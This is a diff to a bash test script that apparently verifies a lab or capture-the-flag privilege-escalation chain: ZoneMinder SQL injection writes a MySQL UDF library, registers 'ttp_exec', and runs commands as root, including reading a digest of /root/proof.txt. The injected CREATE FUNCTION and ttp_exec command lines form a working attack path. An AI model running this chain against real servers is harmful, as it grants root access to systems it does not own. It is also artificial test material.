@@ -14,7 +14,9 @@ test -s /tmp/ttp_udf_probe.so
 [[ ! -e "$plugin_path" ]] || { echo 'FAIL: test UDF already in plugin directory' >&2; exit 1; }
 cleanup() {
     mysql --user=zmuser --password=zmpass -Nse 'DROP FUNCTION IF EXISTS ttp_exec' >/dev/null 2>&1 || true
-    rm -f "$plugin_path" "$marker" "$flagmarker" /tmp/ttp_udf_probe.so || true
+    # Root-owned artifacts are removed with this disposable Docker container.
+    # Do not attempt to delete them from the unprivileged test process.
+    rm -f /tmp/pebbles-udf-injection-response.txt || true
 }
 trap cleanup EXIT
 
@@ -42,12 +44,21 @@ test -s "$plugin_path" || { echo 'FAIL: SQLi could not write to real MySQL plugi
 inject "CREATE FUNCTION ttp_exec RETURNS INTEGER SONAME 'ttp_udf_probe.so'"
 mysql --user=zmuser --password=zmpass -Nse "SELECT COUNT(*) FROM mysql.func WHERE name='ttp_exec'" | grep -Fxq 1 || { echo 'FAIL: genuine MySQL UDF registration failed' >&2; exit 1; }
 
-inject "SELECT ttp_exec('id -u > $marker')"
+# UDF commands execute as root. Explicitly allow the unprivileged verifier
+# to read non-secret markers without weakening permissions on /root/proof.txt.
+inject "SELECT ttp_exec('id -u > $marker && chmod 0644 $marker')"
 test -s "$marker" || { echo 'FAIL: actual UDF command did not run' >&2; exit 1; }
 [[ "$(cat "$marker")" = 0 ]] || { echo 'FAIL: actual UDF command was not root' >&2; exit 1; }
 [[ "$(stat -c '%u' "$marker")" = 0 ]] || { echo 'FAIL: root-owned UDF proof missing' >&2; exit 1; }
-inject "SELECT ttp_exec('cat /root/proof.txt > $flagmarker')"
+
+# Only a SHA256 digest of the root proof is exposed to www-data.
+[[ "${PEBBLES_EXPECTED_ROOT_SHA256:-}" =~ ^[a-f0-9]{64}$ ]] || {
+    echo 'FAIL: missing expected root proof SHA256 from harness' >&2; exit 1;
+}
+inject "SELECT ttp_exec('sha256sum /root/proof.txt > $flagmarker && chmod 0644 $flagmarker')"
 test -s "$flagmarker" || { echo 'FAIL: UDF could not read the root proof' >&2; exit 1; }
-[[ "$(cat "$flagmarker")" = 'TTP{pebbles_unverified_demo_not_for_release}' ]] || { echo 'FAIL: UDF root proof content mismatch' >&2; exit 1; }
-[[ "$(stat -c '%u' "$flagmarker")" = 0 ]] || { echo 'FAIL: UDF did not write the proof as OS root' >&2; exit 1; }
-echo 'PASS: unprivileged www-data -> genuine ZoneMinder SQLi -> MySQL plugin -> real UID 0 -> /root/proof.txt'
+actual_digest=$(cut -d' ' -f1 "$flagmarker")
+[[ "$actual_digest" = "$PEBBLES_EXPECTED_ROOT_SHA256" ]] || { echo 'FAIL: UDF root proof digest mismatch' >&2; exit 1; }
+[[ "$(stat -c '%u' "$flagmarker")" = 0 ]] || { echo 'FAIL: UDF did not write the digest as root' >&2; exit 1; }
+! test -r /root/proof.txt || { echo 'FAIL: www-data can read the root proof directly' >&2; exit 1; }
+echo 'PASS: www-data -> genuine ZoneMinder SQLi -> MySQL UDF -> real UID 0 -> root proof digest'
